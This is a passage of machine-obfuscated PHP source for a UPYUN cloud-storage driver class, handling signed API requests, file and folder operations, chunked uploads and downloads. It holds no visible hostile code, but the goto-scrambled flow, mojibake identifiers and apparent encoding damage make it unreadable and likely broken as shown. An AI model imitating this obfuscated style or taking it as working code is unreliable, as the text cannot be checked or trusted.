PathDriverStream($cÄ”Õ÷¾À, $dÛì²œø¿Ñ); return $aà²’×´°Ì->hashMd5($cÄ”Õ÷¾À); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\72\57\x2f\166\x30\x2e\x61\x70\x69\56\x75\x70\171\x75\156\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($D†³èô¦¼®) { parent::__construct(); $this->_init($D†³èô¦¼®); } public function _init($A·ø‰æ™ñ×) { $dĞæîòÎø =& $_SERVER[Ç³Íß¦Ó]; foreach ($A·ø‰æ™ñ× as $C‰¥…×äÙ´ => $d·•åøñ¸Ş) { if (isset($this->{$C‰¥…×äÙ´})) { $this->{$C‰¥…×äÙ´} = $d·•åøñ¸Ş; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($dĞæîòÎø[1328] . LNG($dĞæîòÎø[1260])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($e…ŒÇ™ë¦Š, $E¶àİˆÚµ = "\107\105\x54") { $FÜÁö¿ŠçŞ =& $_SERVER[Ç³Íß¦Ó]; $d¸„¶Áâ = gmdate($FÜÁö¿ŠçŞ[1294]); $fˆòÅ•Ú‘ = base64_encode(hash_hmac($FÜÁö¿ŠçŞ[1329], "{$E¶àİˆÚµ}\x26{$e…ŒÇ™ë¦Š}\x26{$d¸„¶Áâ}", md5("{$this->userpass}"), !0)); $D´â®‘‚Û = array("\101\x75\164\x68\157\x72\151\172\x61\164\151\x6f\156\x3a\x55\120\131\x55\x4e\40{$this->username}\72{$fˆòÅ•Ú‘}", "\x44\141\x74\x65\x3a{$d¸„¶Áâ}"); return $D´â®‘‚Û; } public function ussRequest($DğšÔÇˆÇ, $d÷¢¯š† = "\107\105\124", $fÕ¸¨Ôí¨ˆ = false, $aÕº×ğÄöØ = false, $Eôí´Òâêñ = false) { goto B–«¸‚¦; B–«¸‚¦: $aÇ¢›Â«•Ì =& $_SERVER[Ç³Íß¦Ó]; $DğšÔÇˆÇ = trim($DğšÔÇˆÇ, $aÇ¢›Â«•Ì[8]); $eï„Á”Î¨ß = "\x2f{$this->bucket}\x2f{$DğšÔÇˆÇ}"; goto b®ÏñíÙôÕ; b®ÏñíÙôÕ: $b¦ô´èÒ÷ä = $this->ussHeaders($eï„Á”Î¨ß, $d÷¢¯š†); if ($aÕº×ğÄöØ) { $b¦ô´èÒ÷ä = array_merge($b¦ô´èÒ÷ä, $aÕº×ğÄöØ); } $bÑïçÆÒ´ = url_request($this->endpoint . $eï„Á”Î¨ß, $d÷¢¯š†, $fÕ¸¨Ôí¨ˆ, $b¦ô´èÒ÷ä, $Eôí´Òâêñ); goto CÅÍôÎöÏ×; CÅÍôÎöÏ×: if (!$bÑïçÆÒ´) { return array($aÇ¢›Â«•Ì[1086] => !1, $aÇ¢›Â«•Ì[1088] => $aÇ¢›Â«•Ì[1330]); } if (strtolower($d÷¢¯š†) == $aÇ¢›Â«•Ì[190] || in_array($bÑïçÆÒ´[$aÇ¢›Â«•Ì[1086]], array($aÇ¢›Â«•Ì[1187], $aÇ¢›Â«•Ì[1331]))) { $fÕ¸¨Ôí¨ˆ = $bÑïçÆÒ´[$aÇ¢›Â«•Ì[1332]]; } else { $fÕ¸¨Ôí¨ˆ = json_decode($bÑïçÆÒ´[$aÇ¢›Â«•Ì[1088]], !0); if (!$fÕ¸¨Ôí¨ˆ) { $fÕ¸¨Ôí¨ˆ = $bÑïçÆÒ´[$aÇ¢›Â«•Ì[1088]]; } else { if (!$bÑïçÆÒ´[$aÇ¢›Â«•Ì[714]] && isset($fÕ¸¨Ôí¨ˆ[$aÇ¢›Â«•Ì[1333]])) { $fÕ¸¨Ôí¨ˆ = $fÕ¸¨Ôí¨ˆ[$aÇ¢›Â«•Ì[1333]]; } } } return array($aÇ¢›Â«•Ì[1086] => $bÑïçÆÒ´[$aÇ¢›Â«•Ì[714]], $aÇ¢›Â«•Ì[1088] => $fÕ¸¨Ôí¨ˆ); goto B·Â•£Â¢®; B·Â•£Â¢®: } public function mkfile($cÅõ’ŒØÀ, $b•áÚÍ˜ë÷ = '', $d²Ê‹ŞÒ”¢ = REPEAT_RENAME) { if ($this->setContent($cÅõ’ŒØÀ, $b•áÚÍ˜ë÷)) { return $this->getPathOuter($cÅõ’ŒØÀ); } return !1; } public function mkdir($fóòÖ¬Ìæò, $FçË¨ù½•İ = REPEAT_SKIP) { $Cß¦‹”æ…Ÿ =& $_SERVER[Ç³Íß¦Ó]; $bËâğøĞ¸Ø = trim($fóòÖ¬Ìæò, $Cß¦‹”æ…Ÿ[8]); if ($this->_isFolder($bËâğøĞ¸Ø)) { return $this->getPathOuter($bËâğøĞ¸Ø); } $e›ÌìêÔœ = array($Cß¦‹”æ…Ÿ[1334]); $bĞ’É“¸‡î = $this->ussRequest($bËâğøĞ¸Ø, $Cß¦‹”æ…Ÿ[223], !1, $e›ÌìêÔœ); return $bĞ’É“¸‡î[$Cß¦‹”æ…Ÿ[1086]] ? $this->getPathOuter($bËâğøĞ¸Ø) : !1; } public function copyFile($D”¤äì³, $CÈ¨ï“¹Ó¸) { $AéèŸÀ²Îä =& $_SERVER[Ç³Íß¦Ó]; $C¤Ô‰­Åš = array($AéèŸÀ²Îä[1335] . "\x2f{$this->bucket}\x2f{$D”¤äì³}", $AéèŸÀ²Îä[1336]); $eÄƒéØ£• = $this->ussRequest($CÈ¨ï“¹Ó¸, $AéèŸÀ²Îä[225], !1, $C¤Ô‰­Åš); return $eÄƒéØ£•[$AéèŸÀ²Îä[1086]] ? !0 : $this->getPathOuter($CÈ¨ï“¹Ó¸); } public function moveFile($Bå•šáÇì, $d³ù—ß‹¦è) { $f¶çÚŠĞë› =& $_SERVER[Ç³Íß¦Ó]; $F²É•¹í¡— = array($f¶çÚŠĞë›[1337] . "\x2f{$this->bucket}\x2f{$Bå•šáÇì}", $f¶çÚŠĞë›[1336]); $a•ö¦¢‰ˆô = $this->ussRequest($d³ù—ß‹¦è, $f¶çÚŠĞë›[225], !1, $F²É•¹í¡—); return $a•ö¦¢‰ˆô[$f¶çÚŠĞë›[1086]] ? !0 : $this->getPathOuter($d³ù—ß‹¦è); } public function delFile($a±°Ş¦—ê¾) { $aŠÖ„Çéµ¹ =& $_SERVER[Ç³Íß¦Ó]; $aİ¨È”½‘ğ = $this->ussRequest($a±°Ş¦—ê¾, $aŠÖ„Çéµ¹[1338]); return $aİ¨È”½‘ğ[$aŠÖ„Çéµ¹[1086]] ? !0 : !1; } public function delFolder($eÜĞí”¹ê) { goto C©óÔÊ’ØÔ; b¼¢Ù„ƒ÷…: $F’‡ªêø·¿ = $eçªœÊœë = array(); $this->fileList($eÜĞí”¹ê, $F’‡ªêø·¿, $eçªœÊœë, !0); $this->listItemCache = !0; goto b©ùÎ¹ÏÕ; Dåà‘î³·Î: return $eÉ‹¶ğÕç[$AÅß—ç‹®„[1086]]; goto F÷ø¸µ†•Í; b©ùÎ¹ÏÕ: foreach ($eçªœÊœë as $cƒğŸ‰‡“) { $eÉ‹¶ğÕç = $this->ussRequest($cƒğŸ‰‡“[$AÅß—ç‹®„[28]], $AÅß—ç‹®„[1338]); if (!$eÉ‹¶ğÕç[$AÅß—ç‹®„[1086]]) { return !1; } } foreach ($F’‡ªêø·¿ as $E†ŞŞÊ•) { $eÉ‹¶ğÕç = $this->ussRequest($E†ŞŞÊ•, $AÅß—ç‹®„[1338]); if (!$eÉ‹¶ğÕç[$AÅß—ç‹®„[1086]]) { return !1; } } $eÉ‹¶ğÕç = $this->ussRequest($eÜĞí”¹ê, $AÅß—ç‹®„[1338]); goto Dåà‘î³·Î; C©óÔÊ’ØÔ: $AÅß—ç‹®„ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->exist($eÜĞí”¹ê)) { return !0; } $this->listItemCache = !1; goto b¼¢Ù„ƒ÷…; F÷ø¸µ†•Í: } public function rename($EÚÍ¼İÆ, $D½¦ÁÄ·¹Ÿ) { if ($this->isFile($EÚÍ¼İÆ)) { $D½¦ÁÄ·¹Ÿ = get_path_father($EÚÍ¼İÆ) . $D½¦ÁÄ·¹Ÿ; return $this->moveFile($EÚÍ¼İÆ, $D½¦ÁÄ·¹Ÿ); } return $this->renameObject($EÚÍ¼İÆ, $D½¦ÁÄ·¹Ÿ); } public function fileInfo($dŒØ©Œ–ìó, $e¿Ğ§µ±› = false, $E«Š‚Ó ˜í = array()) { goto eÎŒŠ›‘; Cô×ù­îÕ¤: $fßàˆ»Ä©[$AÇ¸ğá™…[193]] = $fßàˆ»Ä©[$AÇ¸ğá™…[84]] = 0; $fßàˆ»Ä©[$AÇ¸ğá™…[194]] = $fßàˆ»Ä©[$AÇ¸ğá™…[195]] = !0; if (empty($E«Š‚Ó ˜í)) { $E«Š‚Ó ˜í = $this->objectMeta($dŒØ©Œ–ìó); if (!$E«Š‚Ó ˜í) { return $fßàˆ»Ä©; } } goto AÙŒ°µ’¡; d»ˆé“ã²Ü: return $fßàˆ»Ä©; goto dÊğäÛÈÄ; eÎŒŠ›‘: $AÇ¸ğá™… =& $_SERVER[Ç³Íß¦Ó]; $fßàˆ»Ä© = array($AÇ¸ğá™…[28] => $this->pathThis($dŒØ©Œ–ìó), $AÇ¸ğá™…[76] => $this->getPathOuter($AÇ¸ğá™…[8] . $dŒØ©Œ–ìó), $AÇ¸ğá™…[29] => $AÇ¸ğá™…[192], $AÇ¸ğá™…[78] => isset($E«Š‚Ó ˜í[$AÇ¸ğá™…[78]]) ? $E«Š‚Ó ˜í[$AÇ¸ğá™…[78]] : 0, $AÇ¸ğá™…[168] => $this->ext($dŒØ©Œ–ìó)); if ($e¿Ğ§µ±›) { return $fßàˆ»Ä©; } goto Cô×ù­îÕ¤; AÙŒ°µ’¡: $fßàˆ»Ä©[$AÇ¸ğá™…[193]] = intval($E«Š‚Ó ˜í[$AÇ¸ğá™…[1339]]); $fßàˆ»Ä©[$AÇ¸ğá™…[84]] = intval($E«Š‚Ó ˜í[$AÇ¸ğá™…[1340]]); $fßàˆ»Ä©[$AÇ¸ğá™…[78]] = $E«Š‚Ó ˜í[$AÇ¸ğá™…[78]]; goto d»ˆé“ã²Ü; dÊğäÛÈÄ: } public function folderInfo($Fİğò¹¨ÌÌ, $bÁœ‚õİ® = false) { goto báÏ®ŞØĞ; C‘ÄĞ‰äê›: $fî‹ƒÑçø[$e¬é¦‹‡ÀÀ[193]] = intval($f‚Œ’ åÀĞ[$e¬é¦‹‡ÀÀ[1339]]); $fî‹ƒÑçø[$e¬é¦‹‡ÀÀ[84]] = intval($f‚Œ’ åÀĞ[$e¬é¦‹‡ÀÀ[1340]]); return $fî‹ƒÑçø; goto D‘¯Õ®õ¼; báÏ®ŞØĞ: $e¬é¦‹‡ÀÀ =& $_SERVER[Ç³Íß¦Ó]; $fî‹ƒÑçø = array($e¬é¦‹‡ÀÀ[28] => $this->pathThis($Fİğò¹¨ÌÌ), $e¬é¦‹‡ÀÀ[76] => $this->getPathOuter($e¬é¦‹‡ÀÀ[8] . $Fİğò¹¨ÌÌ), $e¬é¦‹‡ÀÀ[29] => $e¬é¦‹‡ÀÀ[77]); if ($bÁœ‚õİ®) { return $fî‹ƒÑçø; } goto aÌ¥ˆ–áÂ×; aÌ¥ˆ–áÂ×: $fî‹ƒÑçø[$e¬é¦‹‡ÀÀ[193]] = $fî‹ƒÑçø[$e¬é¦‹‡ÀÀ[84]] = 0; $fî‹ƒÑçø[$e¬é¦‹‡ÀÀ[194]] = $fî‹ƒÑçø[$e¬é¦‹‡ÀÀ[195]] = !0; if (empty($f‚Œ’ åÀĞ)) { $f‚Œ’ åÀĞ = $this->objectMeta($Fİğò¹¨ÌÌ); if (!$f‚Œ’ åÀĞ) { return $fî‹ƒÑçø; } } goto C‘ÄĞ‰äê›; D‘¯Õ®õ¼: } private function listObjs($E¡ä›î¨¢Ñ, $bÀ«†ê±®Î = 0, $D¬À¡¨ŞÈ… = 1000) { $cÈ¬å£·à„ =& $_SERVER[Ç³Íß¦Ó]; $AôÀ¬…Ú = array($cÈ¬å£·à„[1341], $cÈ¬å£·à„[1342] . $D¬À¡¨ŞÈ…); if ($bÀ«†ê±®Î) { $AôÀ¬…Ú[] = $cÈ¬å£·à„[1343] . $bÀ«†ê±®Î; } $díåïëË‹« = $this->ussRequest($E¡ä›î¨¢Ñ, $cÈ¬å£·à„[227], !1, $AôÀ¬…Ú); return !$díåïëË‹«[$cÈ¬å£·à„[1086]] ? !1 : $díåïëË‹«[$cÈ¬å£·à„[1088]]; } private function fileList($Fïîí„ù±, &$c­Š…Ù¯¿º, &$Fã°ÄŸÔÃ†, $E¶ÆÌÀ³†ï = false) { goto AœòÂÖ´‚; EÕ§ƒ‘À¹¿: if ($D‚¶ª­ª±) { $this->cacheMethod($B¥„Ô…‚ËØ[198], $Fïîí„ù±, !0); } goto BŒó¢ŒåÚ; AœòÂÖ´‚: $B¥„Ô…‚ËØ =& $_SERVER[Ç³Íß¦Ó]; $fÇÆ‡Õˆ¹¬ = $B¥„Ô…‚ËØ[33]; $AÌ•œğ„Š‰ = 1000; goto BŠ„¯‡‰±; BŠ„¯‡‰±: $f‰ùš«äî” = rtrim($Fïîí„ù±, $B¥„Ô…‚ËØ[8]) . $B¥„Ô…‚ËØ[8]; $D‚¶ª­ª± = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $Aœ«šß£¦ = $this->listObjs($Fïîí„ù±, $fÇÆ‡Õˆ¹¬, $AÌ•œğ„Š‰); if (!$Aœ«šß£¦) { return !1; } $fÇÆ‡Õˆ¹¬ = isset($Aœ«šß£¦[$B¥„Ô…‚ËØ[1344]]) ? $Aœ«šß£¦[$B¥„Ô…‚ËØ[1344]] : $B¥„Ô…‚ËØ[33]; $e·–ÛĞÒ§ø = isset($Aœ«šß£¦[$B¥„Ô…‚ËØ[1345]]) ? $Aœ«šß£¦[$B¥„Ô…‚ËØ[1345]] : array(); foreach ($e·–ÛĞÒ§ø as $b×àÌ¦á¨°) { $aôÀôïÖğ = $b×àÌ¦á¨°[$B¥„Ô…‚ËØ[29]] == $B¥„Ô…‚ËØ[77] ? !0 : !1; $f¥’«‹Öôø = ltrim($f‰ùš«äî” . $b×àÌ¦á¨°[$B¥„Ô…‚ËØ[28]], $B¥„Ô…‚ËØ[8]) . ($aôÀôïÖğ ? $B¥„Ô…‚ËØ[8] : $B¥„Ô…‚ËØ[33]); $eØƒ‘§İĞ = array($B¥„Ô…‚ËØ[28] => $f¥’«‹Öôø, $B¥„Ô…‚ËØ[29] => $aôÀôïÖğ ? $B¥„Ô…‚ËØ[77] : $B¥„Ô…‚ËØ[192], $B¥„Ô…‚ËØ[78] => $b×àÌ¦á¨°[$B¥„Ô…‚ËØ[334]], $B¥„Ô…‚ËØ[1340] => $b×àÌ¦á¨°[$B¥„Ô…‚ËØ[1346]]); if ($D‚¶ª­ª±) { $this->cacheMethod($B¥„Ô…‚ËØ[198], $f¥’«‹Öôø, $aôÀôïÖğ); $this->cacheMethod($B¥„Ô…‚ËØ[199], $f¥’«‹Öôø, $eØƒ‘§İĞ); } if ($aôÀôïÖğ) { $c­Š…Ù¯¿º[] = $f¥’«‹Öôø; if ($E¶ÆÌÀ³†ï) { $this->fileList($f¥’«‹Öôø, $c­Š…Ù¯¿º, $Fã°ÄŸÔÃ†, $E¶ÆÌÀ³†ï); } continue; } $Fã°ÄŸÔÃ†[] = $eØƒ‘§İĞ; } if (count($e·–ÛĞÒ§ø) < $AÌ•œğ„Š‰) { break; } } goto EÕ§ƒ‘À¹¿; BŒó¢ŒåÚ: } public function listPath($D¬¢ïÔÏÔµ, $CÕÕŠ¸ò³ = false) { $fÄİÁ¸ˆ„ =& $_SERVER[Ç³Íß¦Ó]; $Eåå‰†»á® = $DîÏÖ–í = array(); $this->fileList($D¬¢ïÔÏÔµ, $Eåå‰†»á®, $DîÏÖ–í); foreach ($Eåå‰†»á® as $bˆ¼‡è¹¸ => $B¥á‚š») { $Eåå‰†»á®[$bˆ¼‡è¹¸] = $this->folderInfo($B¥á‚š», $CÕÕŠ¸ò³); } foreach ($DîÏÖ–í as $bˆ¼‡è¹¸ => $B¥á‚š») { $DîÏÖ–í[$bˆ¼‡è¹¸] = $this->fileInfo($B¥á‚š»[$fÄİÁ¸ˆ„[28]], $CÕÕŠ¸ò³, $B¥á‚š»); } return array($fÄİÁ¸ˆ„[75] => $Eåå‰†»á®, $fÄİÁ¸ˆ„[74] => $DîÏÖ–í); } public function has($e‰Ê‘ÈÍ†È, $D©³Û½…° = false, $C–’šàİºô = true) { goto eÛÊ¥áá·; aòâ˜í£ëˆ: while (!0) { check_abort(); $AÂø‹œù‹— = $this->listObjs($e‰Ê‘ÈÍ†È, $Eã©ƒ’–„¥, $EŒÜ–Ü°—¤); if (!$AÂø‹œù‹—) { return !1; } $Eã©ƒ’–„¥ = isset($AÂø‹œù‹—[$C¾÷Ä­ëáŒ[1344]]) ? $AÂø‹œù‹—[$C¾÷Ä­ëáŒ[1344]] : $C¾÷Ä­ëáŒ[33]; $cğõ™×¤¤ = isset($AÂø‹œù‹—[$C¾÷Ä­ëáŒ[1345]]) ? $AÂø‹œù‹—[$C¾÷Ä­ëáŒ[1345]] : array(); if (empty($cğõ™×¤¤)) { break; } $fİ£¿Èµ£ = array_filter($cğõ™×¤¤, function ($A–´ï‚¢ôå) { $F·àƒ¥ïŸ± =& $_SERVER[Ç³Íß¦Ó]; return $A–´ï‚¢ôå[$F·àƒ¥ïŸ±[29]] == $F·àƒ¥ïŸ±[77]; }); $Fä¡ÌØ¯á¡ = count($cğõ™×¤¤); $fİ£¿Èµ£ = count($fİ£¿Èµ£); $a°æÖİÁ© = $Fä¡ÌØ¯á¡ - $fİ£¿Èµ£; if ($D©³Û½…°) { $C“èå°¦ÛÅ += $fİ£¿Èµ£; $d¬™«÷½îÂ += $a°æÖİÁ©; if ($Fä¡ÌØ¯á¡ < $EŒÜ–Ü°—¤) { break; } continue; } if ($C–’šàİºô) { if ($a°æÖİÁ©) { return !0; } } else { if ($fİ£¿Èµ£) { return !0; } } if ($Fä¡ÌØ¯á¡ < $EŒÜ–Ü°—¤) { break; } } if ($D©³Û½…°) { return array($C¾÷Ä­ëáŒ[202] => $d¬™«÷½îÂ, $C¾÷Ä­ëáŒ[203] => $C“èå°¦ÛÅ); } return !1; goto AÛ‹™á˜Šê; eÛÊ¥áá·: $C¾÷Ä­ëáŒ =& $_SERVER[Ç³Íß¦Ó]; $Eã©ƒ’–„¥ = $C¾÷Ä­ëáŒ[33]; $EŒÜ–Ü°—¤ = 500; goto FŒŒè‚Òè¾; FŒŒè‚Òè¾: $d¬™«÷½îÂ = 0; $C“èå°¦ÛÅ = 0; $BÄ‡†Œ¸èÑ = rtrim($e‰Ê‘ÈÍ†È, $C¾÷Ä­ëáŒ[8]) . $C¾÷Ä­ëáŒ[8]; goto aòâ˜í£ëˆ; AÛ‹™á˜Šê: } public function listAll($c•¡…„ÍÁ³) { goto f”‹Îßïá; F±ßéÍ­Îí: return $this->listAllFiles($c•¡…„ÍÁ³, array_keys($aİËÑÙïƒ), $aİËÑÙïƒ); goto cÅÒ›ÅÇ; f”‹Îßïá: $Dˆš÷¤š­œ =& $_SERVER[Ç³Íß¦Ó]; $a²ÏÉ¹»éÆ = $b®‰Šñ¿« = array(); $this->fileList($c•¡…„ÍÁ³, $a²ÏÉ¹»éÆ, $b®‰Šñ¿«, !0); goto B›¹×Õ¦ä•; B›¹×Õ¦ä•: $aİËÑÙïƒ = array(); foreach ($b®‰Šñ¿« as $aßÈ…ÈÓ¥—) { $aİËÑÙïƒ[$aßÈ…ÈÓ¥—[$Dˆš÷¤š­œ[28]]] = $aßÈ…ÈÓ¥—[$Dˆš÷¤š­œ[78]]; } foreach ($a²ÏÉ¹»éÆ as $aßÈ…ÈÓ¥—) { if (is_string($aßÈ…ÈÓ¥—)) { $aİËÑÙïƒ[$aßÈ…ÈÓ¥—] = 0; } } goto F±ßéÍ­Îí; cÅÒ›ÅÇ: } public function canRead($C•¥²èá¹î) { return $this->exist($C•¥²èá¹î) ? !0 : !1; } public function canWrite($aöÓ½óÃÚí) { return $this->exist($aöÓ½óÃÚí) ? !0 : !1; } public function getContent($f–ÆŠÎ…Ô) { return $this->fileSubstr($f–ÆŠÎ…Ô, 0, -1); } public function setContent($EŠÚ¸’‚”¸, $AÜÓÉòãº© = '') { $E¾­Øá¼Ìò =& $_SERVER[Ç³Íß¦Ó]; if (!$AÜÓÉòãº©) { $Eæ×æÉÄÀ¿ = $this->ussRequest($EŠÚ¸’‚”¸, $E¾­Øá¼Ìò[223]); return $Eæ×æÉÄÀ¿[$E¾­Øá¼Ìò[1086]]; } $B‚‹éƒ«§Í = $this->tempFile($this->pathThis($EŠÚ¸’‚”¸)); file_put_contents($B‚‹éƒ«§Í, $AÜÓÉòãº©); if ($this->upload($EŠÚ¸’‚”¸, $B‚‹éƒ«§Í)) { $this->tempFileRemve($B‚‹éƒ«§Í); return !0; } return !1; } public function fileSubstr($e•Ñ•­¿­ã, $aĞè¬¸¶©”, $f»óõ×”õ) { $F”ŠÚÚ“Ø =& $_SERVER[Ç³Íß¦Ó]; if (!($fƒ…ËÛ‰Ú = $this->link($e•Ñ•­¿­ã))) { return !1; } $Aµ…æŞõÜù = !1; if ($f»óõ×”õ > 0) { $BìãËÖˆé = $aĞè¬¸¶©” + $f»óõ×”õ - 1; $Aµ…æŞõÜù = array($F”ŠÚÚ“Ø[1307] . $aĞè¬¸¶©” . $F”ŠÚÚ“Ø[438] . $BìãËÖˆé); } $BÙ¨±íÛ… = url_request($fƒ…ËÛ‰Ú, $F”ŠÚÚ“Ø[227], !1, $Aµ…æŞõÜù); return $BÙ¨±íÛ…[$F”ŠÚÚ“Ø[714]] ? $BÙ¨±íÛ…[$F”ŠÚÚ“Ø[1088]] : !1; } public function upload($dß±á®†Ó, $aÙÜ«øùš, $D¦å¬§ˆ¢ = false, $Eİ¥¸î¸Âß = REPEAT_REPLACE) { goto d˜Œ£°»¹; c¸Œù¯£Ó: do { $d·‡™ìáš = $e‡î½Ê—ÀÜ[$FÉªåÄøæ[1353]]; fseek_64($dá…°”‡Ææ, $a—¬Šƒ®Ù); $C³ƒ–˜½ = fread($dá…°”‡Ææ, $d·‡™ìáš); $A¬°’°ù¶¿ = 0; do { $A¬°’°ù¶¿++; $e‡î½Ê—ÀÜ = $this->uploadPart($dß±á®†Ó, $e‡î½Ê—ÀÜ, $C³ƒ–˜½); } while (!$e‡î½Ê—ÀÜ && $A¬°’°ù¶¿ < 3); if (!$e‡î½Ê—ÀÜ) { return !1; } $EÑ›ùŠâøƒ = $e‡î½Ê—ÀÜ[$FÉªåÄøæ[1352]]; $a—¬Šƒ®Ù += $d·‡™ìáš; } while ($EÑ›ùŠâøƒ != -1); fclose($dá…°”‡Ææ); $C¿óÃÛßêÖ = array($FÉªåÄøæ[1354], $FÉªåÄøæ[1355] . $e‡î½Ê—ÀÜ[$FÉªåÄøæ[1356]], $FÉªåÄøæ[1350]); goto BÏè¼°ïè×; d”Š³ÁßÕ¥: $EÑ›ùŠâøƒ = $e‡î½Ê—ÀÜ[$FÉªåÄøæ[1352]]; $dá…°”‡Ææ = fopen($aÙÜ«øùš, $FÉªåÄøæ[1257]); if (!$dá…°”‡Ææ) { return !1; } goto c¸Œù¯£Ó; b©‚æ–Èá¾: $F½áİÁ§¬É = 1024 * 1024 * 10; $C¿óÃÛßêÖ = array($FÉªåÄøæ[1348], $FÉªåÄøæ[1349] . $Bœ©ÊÖÏ‚, $FÉªåÄøæ[1350], $FÉªåÄøæ[1351] . $F½áİÁ§¬É); $bäËÁŠÕ…™ = $this->ussRequest($dß±á®†Ó, $FÉªåÄøæ[225], !1, $C¿óÃÛßêÖ); goto E÷®êè«º¢; BÏè¼°ïè×: $bäËÁŠÕ…™ = $this->ussRequest($dß±á®†Ó, $FÉªåÄøæ[225], !1, $C¿óÃÛßêÖ); return $bäËÁŠÕ…™[$FÉªåÄøæ[1086]] ? $this->getPathOuter($a“ÅïáÒ) : !1; goto DáÚ¡Ğ›Ã÷; E÷®êè«º¢: if (!$bäËÁŠÕ…™[$FÉªåÄøæ[1086]]) { return !1; } $e‡î½Ê—ÀÜ = $bäËÁŠÕ…™[$FÉªåÄøæ[1088]]; $a—¬Šƒ®Ù = 0; goto d”Š³ÁßÕ¥; d˜Œ£°»¹: $FÉªåÄøæ =& $_SERVER[Ç³Íß¦Ó]; $Bœ©ÊÖÏ‚ = IO::size($aÙÜ«øùš); if ($Bœ©ÊÖÏ‚ <= 1024 * 1024 * 200) { $A„„—Œø¥¼ = array($FÉªåÄøæ[1347] . $aÙÜ«øùš); $bäËÁŠÕ…™ = $this->ussRequest($dß±á®†Ó, $FÉªåÄøæ[225], $A„„—Œø¥¼); return $bäËÁŠÕ…™[$FÉªåÄøæ[1086]] ? $this->getPathOuter($dß±á®†Ó) : !1; } goto b©‚æ–Èá¾; DáÚ¡Ğ›Ã÷: } private function uploadPart($e—†ÓŞˆ—«, $F›¸¾¹Û­›, &$DèÁ‘Ÿíµ³) { $dÜÅéàÊËÀ =& $_SERVER[Ç³Íß¦Ó]; $D®Ö½øªƒ = array($dÜÅéàÊËÀ[1357], $dÜÅéàÊËÀ[1355] . $F›¸¾¹Û­›[$dÜÅéàÊËÀ[1356]], $dÜÅéàÊËÀ[1358] . $F›¸¾¹Û­›[$dÜÅéàÊËÀ[1352]], $dÜÅéàÊËÀ[141] . $F›¸¾¹Û­›[$dÜÅéàÊËÀ[1353]]); $b…Å·’¹Ğ‡ = $this->ussRequest($e—†ÓŞˆ—«, $dÜÅéàÊËÀ[225], $DèÁ‘Ÿíµ³, $D®Ö½øªƒ); return !$b…Å·’¹Ğ‡[$dÜÅéàÊËÀ[1086]] ? $b…Å·’¹Ğ‡[$dÜÅéàÊËÀ[1086]] : $b…Å·’¹Ğ‡[$dÜÅéàÊËÀ[1088]]; } public function uploadFormData($C–²Ûîñ, $bîÃªğÄ = 3600) { return $this->uploadPolicy($C–²Ûîñ, $bîÃªğÄ); } public function multiUploadFormData($BÁ²…ÄİÃ, $D¬Ëš–«’Å = 3600) { $dïà×ÍÁ =& $_SERVER[Ç³Íß¦Ó]; $EµÒé§Œ‹¨ = (int) $GLOBALS[$dïà×ÍÁ[7]][$dïà×ÍÁ[78]]; return $this->uploadPolicy($BÁ²…ÄİÃ, $D¬Ëš–«’Å, $EµÒé§Œ‹¨); } private function uploadPolicy($D§¿×„…Á, $b´íœËš‘… = 3600, $B‡›Ü©¯æ = 0) { goto C‹À¿Ã“Å; C‹À¿Ã“Å: $eÔøÉºùÒë =& $_SERVER[Ç³Íß¦Ó]; $C‡ªÊ‘‡Î = $eÔøÉºùÒë[8] . $this->bucket; $CùºŞôÈ¸† = gmdate($eÔøÉºùÒë[1294]); goto cõÔÉËÒ†Ì; cõÔÉËÒ†Ì: $BŸºŸöö¢© = array($eÔøÉºùÒë[1359] => $this->bucket, $eÔøÉºùÒë[1360] => $D§¿×„…Á, $eÔøÉºùÒë[1361] => time() + $b´íœËš‘…, $eÔøÉºùÒë[1362] => $CùºŞôÈ¸†); if ($B‡›Ü©¯æ) { $BŸºŸöö¢©[$eÔøÉºùÒë[1273]] = $B‡›Ü©¯æ; } $Dè•Í³¦›¼ = base64_encode(json_encode($BŸºŸöö¢©)); goto AÂ¦ÛŠë‡è; AÂ¦ÛŠë‡è: $DöçÆª§®  = base64_encode(hash_hmac($eÔøÉºùÒë[1329], "\120\117\123\124\46{$C‡ªÊ‘‡Î}\46{$CùºŞôÈ¸†}\x26{$Dè•Í³¦›¼}", md5("{$this->userpass}"), !0)); $A”³ö¼´¨Ñ = array($eÔøÉºùÒë[1199] => $Dè•Í³¦›¼, $eÔøÉºùÒë[1363] => "\x55\120\x59\125\x4e\x20{$this->username}\x3a{$DöçÆª§® }", $eÔøÉºùÒë[175] => $this->endpoint . $C‡ªÊ‘‡Î); return $A”³ö¼´¨Ñ; goto EØÒàÃì; EØÒàÃì: } public function download($C°®ÚÏ´¬Æ, $c‘ï«¢Ï¨) { goto FÉ „ ¥Ê’; C¯Ç‘ÔŠ—: fclose($B·Ó‰Òïˆæ); return $c‘ï«¢Ï¨; goto D¦ÎÍ¥İ‡”; FÉ „ ¥Ê’: $f­Ú¨Âèö² = IO::getPathInner(IO::mkfile($c‘ï«¢Ï¨)); if (!($E½½çÏ¢âè = $this->link($C°®ÚÏ´¬Æ))) { return !1; } $EºÓ† àØƒ = 0; goto B¨ùõƒÈ¡“; B¨ùõƒÈ¡“: $FƒÙóäˆ—² = 1024 * 200; $B·Ó‰Òïˆæ = fopen($f­Ú¨Âèö², $_SERVER[Ç³Íß¦Ó][1313]); while (!0) { $E¹÷¹Õï¨ = $this->fileSubstr($C°®ÚÏ´¬Æ, $EºÓ† àØƒ, $FƒÙóäˆ—²); if ($E¹÷¹Õï¨ === !1) { return !1; } fwrite($B·Ó‰Òïˆæ, $E¹÷¹Õï¨); $EºÓ† àØƒ += $FƒÙóäˆ—²; if (strlen($E¹÷¹Õï¨) < $FƒÙóäˆ—²) { break; } } goto C¯Ç‘ÔŠ—; D¦ÎÍ¥İ‡”: } public function link($c„îÒĞ£Å, $AóÀì„¤ ¶ = array()) { $AÛ…Ø•äÔ„ =& $_SERVER[Ç³Íß¦Ó]; $c„îÒĞ£Å = trim($c„îÒĞ£Å, $AÛ…Ø•äÔ„[8]); if (!empty($this->token)) { $eõ‹ó‹‚Ø“ = strtotime(date($AÛ…Ø•äÔ„[1364])); $B”Èó¹‘© = 